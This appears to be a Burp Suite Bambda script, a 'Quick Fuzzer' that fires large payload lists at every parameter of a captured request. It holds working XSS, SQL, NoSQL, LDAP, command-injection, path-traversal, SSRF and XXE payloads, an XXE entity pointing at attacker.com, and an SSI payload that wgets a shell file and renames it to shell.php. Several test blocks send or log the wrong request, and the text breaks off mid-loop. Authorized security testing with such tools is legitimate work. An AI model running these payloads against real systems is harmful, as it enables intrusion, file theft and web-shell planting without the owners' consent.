// Quick Fuzzer Bambda Custom Action by zinja-coder@github
// This Bambda extracts all parameters and performs comprehensive fuzzing tests
// You can add/reduce payloads
// You can add/reduce test cases
// Optionally fuzz cookie parameters
// All requests are sent directly without creating new tabs, with detailed logging
// Uncomment and add more payloads as per requirement

// Delay variable, Adjust as per requirement - 1000 = 1 second delay
int GLOBAL_DELAY_MS = 1000; 

// Burp Collborator host or any host name like example.com
String hostname = "<BURPCOLLABORATOR>";

// Different Payloads for Different Attack Types, Add more as per requirement
String[] SPECIAL_CHARS = {
	"!@#$%^&*()", "<>\"'", "[]{}|\\", "~`+=", ";:,./?"    
};

String[] SSI_PAYLOADS = {
    "<!--#exec cmd=\"ls\" -->",
    "<!--#exec cmd=\"cd /root/dir/\">",
    "<!--#exec cmd=\"wget http://"+hostname+"/shell.txt | rename shell.txt shell.php\" -->",
    "<!--#exec cmd=\"dir\" -->",
    "<!--#exec cmd=\"cd C:\\admin\\dir\">",
    "<!--#config errmsg=\"File not found, informs users and password\"-->",
    "<!--#echo var=\"DOCUMENT_NAME\" -->",
    "<!--#echo var=\"DOCUMENT_URI\" -->"
};

String[] XSS_PAYLOADS = {
	"<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'-alert('XSS')-'",
    "\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')></iframe>"
};

String[] SSRF_PAYLOADS = {
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:9200",
    "http://localhost:80",
    "http://0.0.0.0:80",
    "http://[::1]:80",
    "http://10.0.0.1",
    "http://192.168.1.1",
    "http://172.16.0.1",
    "https://127.0.0.1",
    "ftp://127.0.0.1",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stats",
    "ldap://127.0.0.1:389",
    "http://127.1",
    "http://2130706433", // 127.0.0.1 in decimal
    "http://0x7f000001", // 127.0.0.1 in hex
    "http://127.000.000.1",
    "http://" + hostname,
    "https://" + hostname,
    "http://127.0.0.1%2e80",
    "http://127.0.0.1%252e80",
    "http://127.0.0.1%25%32%65%38%30",
    "http://[::ffff:127.0.0.1]",
    "http://[0:0:0:0:0:ffff:127.0.0.1]"
};

String[] SQLI_PAYLOADS = {
    "' OR '1'='1",
    "'",
    "\"",
    "' OR 1=1#",
    "admin'--",
    "' OR 'a'='a",
    "1' OR '1'='1' /*"
};
    
// Command Injection Payloads
String[] COMMAND_INJECTION_PAYLOADS = {
    "; ls -la",
    "| whoami",
    "& dir",
    "`id`",
    "$(whoami)",
    "; cat /etc/passwd",
    "&& echo vulnerable",
    "; ping -c 1 127.0.0.1",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "$(ping -c 1 127.0.0.1)"
};

// Path Traversal/Directory Traversal
String[] PATH_TRAVERSAL_PAYLOADS = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00",
    "file:///etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
};

String[] NULLBYTE_PAYLOADS = {
    "%00",
    "\u0000",
    "%2500",
    "%00.php",
    "%00admin",
    "%c0%80",           // UTF-8 overlong encoding
    "%e0%80%80",        // UTF-8 overlong encoding 3-byte
    "\\x00",            // Literal backslash x00
    "\\0",              // Literal backslash 0
    "%00%00",           // Double null
    "\0"                // Direct null character
};

// LDAP Injection
String[] LDAP_INJECTION_PAYLOADS = {
    "*",
    "*)(&",
    "*))%00",
    ")(cn=*",
    "*)(uid=*",
    "admin)(&(password=*))",
    "*()|%26'"
};

// NoSQL Injection
String[] NOSQL_INJECTION_PAYLOADS = {
    "true, $where: '1 == 1'",
    ", $where: '1 == 1'",
    "$ne=1",
    "[$ne]=1",
    "'; return true; var dummy='",
    "{\"$gt\":\"\"}",
    "{\"$regex\":\".*\"}"
};

// Server-Side Template Injection (SSTI)
String[] SSTI_PAYLOADS = {
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{config}}",
    "<%=7*7%>"
};

// Format String Vulnerabilities
String[] FORMAT_STRING_PAYLOADS = {
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x%x%x",
    "%n%n%n%n%n%n%n%n%n%n",
    "%08x.%08x.%08x.%08x",
    "AAAA%08x.%08x.%08x.%08x"
};

// Email Validation Bypass
String[] EMAIL_BYPASS_PAYLOADS = {
    "test@test@"+hostname,
    "test..test@"+hostname,
    "test@",
    "@test"+hostname,
    "test@test.",
    "\"test\""+hostname
};

// Buffer Overflow/Large Payloads
String[] BUFFER_OVERFLOW_PAYLOADS = {
    "A".repeat(1000),
    "A".repeat(5000),
    "A".repeat(10000),
    "\\x41".repeat(1000),
    "%41".repeat(1000)
};

// Integer Overflow/Underflow
String[] INTEGER_OVERFLOW_PAYLOADS = {
    "2147483647",   // Max 32-bit signed int
    "2147483648",   // Max 32-bit signed int + 1
    "-2147483648",  // Min 32-bit signed int
    "-2147483649",  // Min 32-bit signed int - 1
    "4294967295",   // Max 32-bit unsigned int
    "4294967296",   // Max 32-bit unsigned int + 1
    "9223372036854775807",  // Max 64-bit signed int
    "9223372036854775808"   // Max 64-bit signed int + 1
};

// Unicode/Encoding Tests
String[] UNICODE_PAYLOADS = {
    "\u0000",
    "\u0001\u0002\u0003\u0004\u0005",
    "\uFEFF",
    "\u202E",
    "\u200B\u200C\u200D",
    "test\u0000admin",
    "admin\uFEFFtest"
};

// JSON Injection
String[] JSON_INJECTION_PAYLOADS = {
    "\",\"injected\":\"true\",\"a\":\"",
    "\"}}],\"injected\":true,\"a\":[{\"b\":\"",
    "\",\"admin\":true,\"test\":\"",
    "\\\":\\\"\\\"}],\\\"injected\\\":true}"
};

// Business Logic Tests
String[] BUSINESS_LOGIC_PAYLOADS = {
    "0.00",
    "-0.01",
    "true",
    "false",
    "null",
    "undefined",
    "100",
    "$100",             
    "%100",           
    "50%",            
    "-1",           // Negative price
    "0",            // Zero price
    "0.01",         // Minimal price
    "999999999",    // Very high price
    "-999999999",   // Very negative price
    "0.001",        // Fractional cent
    "1e10",         // Scientific notation
    "1/0",          // Division by zero
    "-0",            // Negative zero
    "âˆž",            // Infinity symbol
    "NaN",          // Not a number
    "null",         // Null value
    "1.999999999999999999", 
    "1,000",        
    "$100",         
    "100.00.00"     
};

String[] XXE_PAYLOADS = {
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/hosts\">]><data>&file;</data>",
    "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\" >]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>"
};

// Deserialization Attack Payloads
String[] DESERIALIZATION_PAYLOADS = {
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4",
    "O:8:\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}",
    "{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\"}"
};

// XPATH Injection Payloads
String[] XPATH_INJECTION_PAYLOADS = {
    "' or '1'='1",
    "x' or 1=1 or 'x'='y",
    "'] | //user/*[contains(*,'pass')] | a['",
    "' and count(//*)=1 and '1'='1",
    "1/0"
};

    
String[] INVALID_DATES = {
    "2024-13-01", "2024-02-30", "2024-00-15", "2024-12-32", "32/13/2024"
};
    
String[] INVALID_TIMES = {
    "25:30:00", "12:70:30", "10:30:70", "99:99:99", "ab:cd:ef"
};
    
// Get the request
var originalRequest = requestResponse.request();
var httpService = requestResponse.httpService();
    
// Extract all parameters based on request type
java.util.List<burp.api.montoya.http.message.params.HttpParameter> allParams = new java.util.ArrayList<>();
    
// Add URL parameters (GET)
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.URL));
    
// Add body parameters (POST)
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.BODY));
    
// Add JSON Parameters 
//String contentType = originalRequest.contentType().toString();
//if (contentType != null && 
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.JSON));
    
// ------------------------------------------------------------ //
// -- Uncomment below line to fuzz cookie parameters as well -- //
//allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.COOKIE));
    
// if there are no parameter to fuzz then exit
if (allParams.isEmpty()) {
    logging.logToOutput("No parameters found to fuzz");
}
    
logging.logToOutput("[ ======================================= ]");
logging.logToOutput("QUICK FUZZER STARTED");
logging.logToOutput("Found " + allParams.size() + " parameters to test");
logging.logToOutput("Target: " + httpService.host() + ":" + httpService.port());
logging.logToOutput("[ ======================================= ]");
logging.logToOutput("CHECK ORGANIZER TAB FOR OUTPUT");
logging.logToOutput("[ ======================================= ]");
    
// Counter for tracking total requests
int totalRequests = 0;
StringBuilder results = new StringBuilder();
results.append("FUZZING RESULTS SUMMARY:\n\n");
    
// ------------------------------------------------------------ //
// --------------- FUZZING Starts ----------------------------- //

// for each parameter, perform all fuzzing tests
for (burp.api.montoya.http.message.params.HttpParameter param: allParams) {
    String paramName = param.name();
    String originalValue = param.value();
    
    logging.logToOutput("\n[ === Testing Parameter: " + paramName + " (original: '" + originalValue + "') === ]");
    results.append("Parameter: " + paramName + " (Type: " + param.type() + ")\n");
    results.append("Original Value: " + originalValue + "\n");
    logging.logToOutput("[ ======================================= ]\n");
    
    // -------------------------- Test 1: Special Characters -------------------- //
    logging.logToOutput("[ === Testing Special characters === ] ");
    for (String specialChar: SPECIAL_CHARS) {
    	String newValue = originalValue + specialChar;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, newValue, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "SPECIAL CHAR: '" + specialChar;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Special Char '" + specialChar + "': " + e.getStackTrace());
    	}

    }
    
    // -------------------------- Test 2: XSS -------------------- //
    logging.logToOutput("[ === Testing XSS PAYLOADS === ] ");
    for (String xssPayload: XSS_PAYLOADS) {
    	//String newValue = originalValue + xssPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, xssPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "XSS Payload: '" + xssPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with XSS Payload '" + xssPayload + "': " + e.getStackTrace());
    	}
    }
    
        // -------------------------- Test 3: SQLI -------------------- //
    logging.logToOutput("[ === Testing SQLI PAYLOADS === ] ");
    for (String sqliPayload: SQLI_PAYLOADS) {
    	String newValue = originalValue + sqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, newValue, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "SQLI Payload: '" + sqliPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with SQLI Payload '" + sqliPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 4: EMPTY VALUES -------------------- //
    logging.logToOutput("[ === Testing EMPTY PAYLOADS === ] ");
    var modifiedRequestEmpty = originalRequest.withParameter(
    	burp.api.montoya.http.message.params.HttpParameter.parameter(
    		paramName, "", param.type())
    );
    
    try {
    	var response = api.http().sendRequest(modifiedRequestEmpty);
     	int status = response.response().statusCode();
    	String result = "EMPTY: " + paramName + " -> Status: " + status;
    
    	// create request/response for organizer
    	var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    	// set annotation
    	requestResponseForOrganizer.annotations().setNotes(result);
    	// send to organizer
    	api.organizer().sendToOrganizer(requestResponseForOrganizer);
    	totalRequests++;
    } catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with EMPTY Payload '" + paramName + "': " + e.getStackTrace());
    	}
    
    // -------------------------- Test 5: INVALID DATES -------------------- //
    for (String date: INVALID_DATES) {
    	//String newValue = originalValue + date;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, date, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "INVALID DATE: '" + date;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with INVALID DATE '" + date + "': " + e.getStackTrace());
    	}
    }
    
    
    // -------------------------- Test 6: INVALID TIME -------------------- //
    for (String time: INVALID_TIMES) {
    	//String newValue = originalValue + date;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, time, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "INVALID DATE: '" + time;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with INVALID TIME '" + time + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 7: NEGATIVE VALUES -------------------- //
    logging.logToOutput("[ === Testing NEGATIVE PAYLOADS === ] ");
    String negativeValue = "-" + originalValue;
    var modifiedRequestNegative = originalRequest.withParameter(
    	burp.api.montoya.http.message.params.HttpParameter.parameter(
    		paramName, originalValue, param.type())
    );
    
    try {
    	var response = api.http().sendRequest(modifiedRequestEmpty);
     	int status = response.response().statusCode();
    	String result = "NEGATIVE: " + paramName + " -> Status: " + status;
    
    	// create request/response for organizer
    	var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    	// set annotation
    	requestResponseForOrganizer.annotations().setNotes(result);
    	// send to organizer
    	api.organizer().sendToOrganizer(requestResponseForOrganizer);
    	totalRequests++;
    } catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with NEGATIVE Payload '" + paramName + "': " + e.getStackTrace());
    	}
    
    // -------------------------- Test 8: INPUT LENGTH -------------------- //
    logging.logToOutput("[ === Testing INPUT LENGTH === ] ");
    StringBuilder longCharString = new StringBuilder();
    for (int i = 0; i < 300; i++) {
    	longCharString.append("a"); 
    }
    StringBuilder longIntString = new StringBuilder();
    for (int i = 0; i < 300; i++) {
    	longIntString.append("1");
    }
    
    ArrayList<StringBuilder> longStrings = new ArrayList<>();
    longStrings.add(longIntString);
    longStrings.add(longCharString);
    
    for (StringBuilder longString: longStrings) {
    	var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, longString.toString(), param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Long String: ";
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Long String:  '" + longString.toString() + "': " + e.getStackTrace());
    	}
    } 
    
    
    // -------------------------- Test 9: SSTI -------------------- //
    logging.logToOutput("[ === Testing SSTI PAYLOADS === ] ");
    for (String sstiPayload: SSTI_PAYLOADS) {
    	//String newValue = originalValue + xssPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, sstiPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "SSTI Payload: '" + sstiPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with SSTI Payload '" + sstiPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 10: NOSQLI -------------------- //
    logging.logToOutput("[ === Testing NOSQLI PAYLOADS === ] ");
    for (String nosqliPayload: NOSQL_INJECTION_PAYLOADS) {
    	String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, newValue, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "NOSQLI Payload: '" + nosqliPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with NOSQLI Payload '" + nosqliPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 11: Path Traversal -------------------- //
    logging.logToOutput("[ === Testing Path Traversal PAYLOADS === ] ");
    for (String pathPayload: PATH_TRAVERSAL_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, pathPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Path Traversal Payload: '" + pathPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Path Traversal Payload '" + pathPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 12: Command Injection -------------------- //
    logging.logToOutput("[ === Testing Command Injection PAYLOADS === ] ");
    for (String commandPayload: COMMAND_INJECTION_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, commandPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Command Injection Payload: '" + commandPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Command Injection Payload '" + commandPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 13: LDAP Injection -------------------- //
    logging.logToOutput("[ === Testing LDAP Injection PAYLOADS === ] ");
    for (String ldapPayload: LDAP_INJECTION_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, ldapPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "LDAP Injection Payload: '" + ldapPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with LDAP Injection Payload '" + ldapPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 14: JSON Injection -------------------- //
    logging.logToOutput("[ === Testing JSON Injection PAYLOADS === ] ");
    for (String jsonPayload: JSON_INJECTION_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, jsonPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "JSON Injection Payload: '" + jsonPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with JSON Injection Payload '" + jsonPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 15: Invalid Emails -------------------- //
    logging.logToOutput("[ === Testing Invalid Emails PAYLOADS === ] ");
    for (String emailPayload: EMAIL_BYPASS_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, emailPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Invalid Email Payload: '" + emailPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Invalid Email Payload '" + emailPayload + "': " + e.getStackTrace());
    	}
    }
    
        // -------------------------- Test 16: String Format Payloads -------------------- //
    logging.logToOutput("[ === Testing String Format PAYLOADS === ] ");
    for (String stringformatPayload: FORMAT_STRING_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
